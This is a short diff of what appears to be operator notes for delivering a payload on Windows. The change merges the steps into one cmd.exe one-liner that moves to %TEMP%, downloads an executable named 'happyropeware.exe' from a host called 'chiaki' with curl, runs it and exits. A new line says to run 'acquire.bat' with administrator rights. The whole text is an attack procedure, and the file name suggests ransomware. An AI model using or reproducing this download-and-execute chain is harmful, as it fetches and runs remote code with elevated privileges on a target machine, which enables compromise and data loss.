@@ -1,6 +1,5 @@
 Deliver the payload by running
-cd %TEMP%
-curl -O http://chiaki:8000/target/release/happyropeware.exe
-happyropeware
-
+cd %TEMP% && curl -O http://chiaki:8000/target/release/happyropeware.exe && happyropeware && exit
 in cmd.exe
+
+Run D:\acquire.bat with admin priv in taskmgr
